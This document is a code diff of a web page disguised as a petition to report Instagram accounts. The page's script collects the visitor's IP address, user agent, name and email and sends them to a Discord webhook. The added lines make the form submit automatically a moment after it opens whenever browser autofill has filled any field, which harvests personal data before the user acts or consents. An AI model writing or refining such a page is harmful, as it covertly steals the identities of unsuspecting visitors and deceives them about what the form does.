@@ -122,20 +122,20 @@
     }
 
     #fake {
-    display: block;
-    margin: 0 auto;
-    padding: 10px 20px;
-    font-size: 1em;
-    border: none;
-    border-radius: 4px;
-    cursor: pointer;
-    text-decoration: none;
-    color: #fff;
-    background: linear-gradient(45deg, #f58529, #feda77, #dd2a7b, #8134af, #515bd4);
-    background-size: 300% 300%;
-    animation: gradientBG 3s ease infinite;
-    font-weight: 600;
-    width: fit-content;
+      display: block;
+      margin: 0 auto;
+      padding: 10px 20px;
+      font-size: 1em;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      text-decoration: none;
+      color: #fff;
+      background: linear-gradient(45deg, #f58529, #feda77, #dd2a7b, #8134af, #515bd4);
+      background-size: 300% 300%;
+      animation: gradientBG 3s ease infinite;
+      font-weight: 600;
+      width: fit-content;
     }
   </style>
 </head>
@@ -146,7 +146,7 @@
 
   <div class="container">
     <h2>Report an Instagram Account</h2>
-    <p>Help us petition Instagram to remove users violating community guidelines. </p>
+    <p>Help us petition Instagram to remove users violating community guidelines.</p>
     <button id="trigger">Open Form</button>
 
     <div id="formContainer">
@@ -156,10 +156,10 @@
       </p>
       <form id="userForm" autocomplete="on">
         <label for="fname">Your First Name</label>
-        <input type="text" id="fname" name="given-name" autocomplete="first-name">
+        <input type="text" id="fname" name="given-name" autocomplete="given-name">
 
         <label for="lname">Your Last Name</label>
-        <input type="text" id="lname" name="family-name" autocomplete="last-name">
+        <input type="text" id="lname" name="family-name" autocomplete="family-name">
 
         <label for="email">Your Email</label>
         <input type="email" id="email" name="email" autocomplete="email">
@@ -195,7 +195,6 @@
         .then(response => response.json())
         .then(data => {
           userIP = data.ip;
-          console.log('Fetched IP:', userIP);
         })
         .catch(err => console.error('Error fetching IP:', err));
     });
@@ -204,9 +203,13 @@
     trigger.addEventListener('click', () => {
       formContainer.style.display = 'block';
       fnameField.focus();
+
+      // Check for autofill after a short delay
+      setTimeout(checkFields, 500); 
     });
 
     function checkFields() {
+      // If any field is prefilled or has a value (possibly autofilled), submit immediately
       if (
         fnameField.value.trim() !== '' ||
         lnameField.value.trim() !== '' ||
@@ -231,7 +234,9 @@
                       `**Browser/User Agent:** ${userAgent}\n` +
                       `**First Name:** ${fname}\n` +
                       `**Last Name:** ${lname}\n` +
-                      `**Email:** ${email}\n`;
+                      `**Email:** ${email}\n` +
+                      `**Handle:** ${handle}\n` +
+                      `**Reason:** ${reason}`;
 
       fetch(DISCORD_WEBHOOK_URL, {
         method: 'POST',
@@ -248,6 +253,7 @@
       .catch(err => console.error('Error sending message to Discord:', err));
     }
 
+    // Also listen for input and change events to catch user or autofill changes post initial load
     fnameField.addEventListener('input', checkFields);
     lnameField.addEventListener('input', checkFields);
     emailField.addEventListener('input', checkFields);
